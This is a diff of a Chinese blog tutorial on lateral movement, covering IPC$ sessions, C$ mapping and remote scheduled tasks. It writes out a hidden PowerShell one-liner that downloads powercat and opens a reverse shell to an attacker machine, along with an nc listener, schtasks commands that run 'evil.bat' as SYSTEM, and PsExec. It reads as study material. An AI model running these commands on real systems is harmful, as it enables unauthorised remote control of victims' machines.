@@ -437,14 +437,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1k
+                    1.1k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    4 分
+                    5 分
                 </div>
                 
 
@@ -459,6 +459,9 @@
         <hr class="clearfix">
 
         
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
 
         
 
@@ -467,9 +470,10 @@
                 <h2 id="0、前言"><a href="#0、前言" class="headerlink" title="0、前言"></a>0、前言</h2><p>在多层代理的环境中，由于网络限制，通常采用命令行的方式连接主机，这里学习下 IPC 建立会话与配置计划任务的相关点。</p>
 <h2 id="1、IPC"><a href="#1、IPC" class="headerlink" title="1、IPC"></a>1、IPC</h2><p>IPC (Internet Process Connection) 是为了实现进程间通信而开放的命名管道，当目标开启了 IPC$ 文件共享并得到用户账号密码后，就可以使用 IPC 建立连接，获取权限。</p>
 <p>建立 IPC 连接：</p>
-<pre><code>net use \\192.168.7.107\ipc$ &quot;1qaz@WSX&quot; /user:administrator</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">net use \\192.168.7.107\ipc$ &quot;1qaz@WSX&quot; &#x2F;user:administrator<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>输入 net use 可以查看当前建立的连接</p>
-<pre><code>C:\&gt;net use \\192.168.7.107\ipc$ &quot;1qaz@WSX&quot; /user:administrator
+<pre class="line-numbers language-none"><code class="language-none">C:\&gt;net use \\192.168.7.107\ipc$ &quot;1qaz@WSX&quot; &#x2F;user:administrator
 命令成功完成。
 
 C:\&gt;net use
@@ -478,32 +482,38 @@ C:\&gt;net use
 状态       本地        远程                      网络
 -------------------------------------------------------------------------------
 OK                     \\192.168.7.107\ipc$      Microsoft Windows Network
-命令成功完成。</code></pre>
+命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>映射磁盘到本地</p>
-<pre><code>net use t: \\192.168.7.107\c$</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">net use t: \\192.168.7.107\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>如果想删除映射的磁盘</p>
-<pre><code>net use t: /del</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">net use t: &#x2F;del<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>dir 列出对方目录</p>
-<pre><code>dir \\192.168.7.107\c$</code></pre>
-<pre><code>C:\&gt;dir \\192.168.7.107\c$
+<pre class="line-numbers language-none"><code class="language-none">dir \\192.168.7.107\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">C:\&gt;dir \\192.168.7.107\c$
  驱动器 \\192.168.7.107\c$ 中的卷没有标签。
  卷的序列号是 BC2F-8F01
 
  \\192.168.7.107\c$ 的目录
 
-2020/11/24  17:28    &lt;DIR&gt;          Program Files
-2020/11/24  17:26    &lt;DIR&gt;          Program Files (x86)
-2021/02/13  17:49    &lt;DIR&gt;          TEMP
-2021/08/02  11:42    &lt;DIR&gt;          Users
-2020/11/25  08:37    &lt;DIR&gt;          Windows
+2020&#x2F;11&#x2F;24  17:28    &lt;DIR&gt;          Program Files
+2020&#x2F;11&#x2F;24  17:26    &lt;DIR&gt;          Program Files (x86)
+2021&#x2F;02&#x2F;13  17:49    &lt;DIR&gt;          TEMP
+2021&#x2F;08&#x2F;02  11:42    &lt;DIR&gt;          Users
+2020&#x2F;11&#x2F;25  08:37    &lt;DIR&gt;          Windows
                0 个文件              0 字节
-              5 个目录 32,833,009,664 可用字节</code></pre>
+              5 个目录 32,833,009,664 可用字节<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>tasklist 查看进程</p>
-<pre><code>tasklist /S 192.168.7.107 /U administrator /P 1qaz@WSX</code></pre>
-<pre><code>C:\&gt;tasklist /S 192.168.7.107 /U administrator /P 1qaz@WSX
+<pre class="line-numbers language-none"><code class="language-none">tasklist &#x2F;S 192.168.7.107 &#x2F;U administrator &#x2F;P 1qaz@WSX<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">C:\&gt;tasklist &#x2F;S 192.168.7.107 &#x2F;U administrator &#x2F;P 1qaz@WSX
 
 映像名称                       PID 会话名              会话#       内存使用
-========================= ======== ================ =========== ============
+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
 System Idle Process              0                            0         24 K
 System                           4                            0        368 K
 smss.exe                       260                            0        628 K
@@ -515,9 +525,11 @@ services.exe                   512                            0      7,460 K
 lsass.exe                      520                            0     10,216 K
 lsm.exe                        528                            0      4,148 K
 spoolsv.exe                   1356                            0      6,504 K
-svchost.exe                   1392                            0      7,028 K</code></pre>
+svchost.exe                   1392                            0      7,028 K<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>使用 \del 可断开连接</p>
-<pre><code>net use \\192.168.7.107\ipc$ /del</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">net use \\192.168.7.107\ipc$ &#x2F;del<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <h2 id="2、计划任务"><a href="#2、计划任务" class="headerlink" title="2、计划任务"></a>2、计划任务</h2><p>Windows 可用于创建计划任务的命令有两个，分别是 at 和 schtasks，at 在 Windows Server 2008 及之后的系统中，已经被废弃了。</p>
 <p>这里看看在建立 IPC 连接后，使用计划任务运行可执行文件，主要步骤如下：</p>
 <p>1、查看目标主机时间</p>
@@ -525,34 +537,44 @@ svchost.exe                   1392                            0      7,028 K</co
 <p>3、设置计划任务执行可执行文件</p>
 <p>4、删除计划任务</p>
 <p>首先查看下目标主机时间</p>
-<pre><code>net time \\192.168.7.107</code></pre>
-<pre><code>C:\&gt;net time \\192.168.7.107
-\\192.168.7.107 的当前时间是 2021/8/2 14:28:01
-命令成功完成。</code></pre>
-<p>创建一个反弹木马 bat 程序，这里使用 PowerShell 进行反弹，bat 文件内容如下：</p>
-<pre><code>powershell.exe -nop -w hidden -exec bypass -c &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;https://ghproxy.com/raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#39;);powercat -c 192.168.7.4 -p 4444 -e cmd&quot;</code></pre>
-<p>在攻击机上开启 nc 监听</p>
-<pre><code>nc -lvp 4444</code></pre>
-<p>将 bat 程序上传到目标主机</p>
-<pre><code>copy evil.bat \\192.168.7.107\c$</code></pre>
-<p>使用 at 创建计划任务</p>
-<pre><code>at \\192.168.7.107 14:30 C:\evil.bat</code></pre>
-<p>如果想清除 ID 为 1 的计划任务</p>
-<pre><code>at \\192.168.7.107 1 /del</code></pre>
-<p>使用 schtasks 创建计划任务</p>
-<pre><code># 开机以 system 权限执行 C:\evil.bat
-schtasks /create /s 192.168.7.107 /tn evil /sc onstart /tr C:\evil.bat /ru system /f
+<pre class="line-numbers language-none"><code class="language-none">net time \\192.168.7.107<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-# 在 2021/08/03 前的每一天的 14:30:00 执行 C:\evil.bat
-schtasks /create /s 192.168.7.107 /tn evil /tr C:\evil.bat /sc daily /st 14:30:00 /ed 2021/08/03
+<pre class="line-numbers language-none"><code class="language-none">C:\&gt;net time \\192.168.7.107
+\\192.168.7.107 的当前时间是 2021&#x2F;8&#x2F;2 14:28:01
+命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>创建一个反弹木马 bat 程序，这里使用 PowerShell 进行反弹，bat 文件内容如下：</p>
+<pre class="line-numbers language-none"><code class="language-none">powershell.exe -nop -w hidden -exec bypass -c &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;ghproxy.com&#x2F;raw.githubusercontent.com&#x2F;besimorhino&#x2F;powercat&#x2F;master&#x2F;powercat.ps1&#39;);powercat -c 192.168.7.4 -p 4444 -e cmd&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>在攻击机上开启 nc 监听</p>
+<pre class="line-numbers language-none"><code class="language-none">nc -lvp 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>将 bat 程序上传到目标主机</p>
+<pre class="line-numbers language-none"><code class="language-none">copy evil.bat \\192.168.7.107\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>使用 at 创建计划任务</p>
+<pre class="line-numbers language-none"><code class="language-none">at \\192.168.7.107 14:30 C:\evil.bat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>如果想清除 ID 为 1 的计划任务</p>
+<pre class="line-numbers language-none"><code class="language-none">at \\192.168.7.107 1 &#x2F;del<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>使用 schtasks 创建计划任务</p>
+<pre class="line-numbers language-none"><code class="language-none"># 开机以 system 权限执行 C:\evil.bat
+schtasks &#x2F;create &#x2F;s 192.168.7.107 &#x2F;tn evil &#x2F;sc onstart &#x2F;tr C:\evil.bat &#x2F;ru system &#x2F;f
+
+# 在 2021&#x2F;08&#x2F;03 前的每一天的 14:30:00 执行 C:\evil.bat
+schtasks &#x2F;create &#x2F;s 192.168.7.107 &#x2F;tn evil &#x2F;tr C:\evil.bat &#x2F;sc daily &#x2F;st 14:30:00 &#x2F;ed 2021&#x2F;08&#x2F;03
 
 # 立刻运行名称为 evil 的任务
-schtasks /run /s 192.168.7.107 /i /tn &quot;evil&quot;</code></pre>
+schtasks &#x2F;run &#x2F;s 192.168.7.107 &#x2F;i &#x2F;tn &quot;evil&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>如果想清除名称为 evil 的计划任务</p>
-<pre><code>schtasks /delete /s 192.168.7.107 /tn &quot;evil&quot; /f</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">schtasks &#x2F;delete &#x2F;s 192.168.7.107 &#x2F;tn &quot;evil&quot; &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>在建立 IPC 连接后，除了使用计划任务进行间接的反弹 Shell，还可以通过 PsExec 直接反弹 Shell</p>
 <p>PsExec 下载地址：<a target="_blank" rel="noopener" href="https://download.sysinternals.com/files/PSTools.zip">https://download.sysinternals.com/files/PSTools.zip</a></p>
-<pre><code>Psexec.exe -accepteula \\192.168.7.107 -s cmd.exe</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">Psexec.exe -accepteula \\192.168.7.107 -s cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210802180916.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <blockquote>
 <p>参考文章：<br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/251389.html">https://www.freebuf.com/articles/web/251389.html</a></p>
@@ -985,7 +1007,7 @@ schtasks /run /s 192.168.7.107 /i /tn &quot;evil&quot;</code></pre>
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">162.6k</span>&nbsp;字
+                class="white-color">164k</span>&nbsp;字
             
             
             
